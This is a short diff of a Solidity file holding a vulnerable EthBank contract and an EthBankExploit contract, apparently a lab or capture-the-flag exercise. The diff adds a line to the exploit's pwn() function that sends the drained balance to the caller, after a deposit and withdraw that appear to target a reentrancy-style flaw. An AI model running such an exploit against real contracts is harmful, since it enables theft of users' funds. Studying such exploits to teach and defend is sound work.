@@ -2,6 +2,7 @@
 pragma solidity ^0.8.20;
 
 contract EthBank {
+
     mapping(address => uint256) public balances;
 
     function deposit() external payable {
@@ -37,5 +38,6 @@ contract EthBankExploit {
     function pwn() external payable {
         bank.deposit{value: 1 ether}();
         bank.withdraw();
+        payable(msg.sender).transfer(address(this).balance); // envia para quem ta chamando o contrato
     }
 }
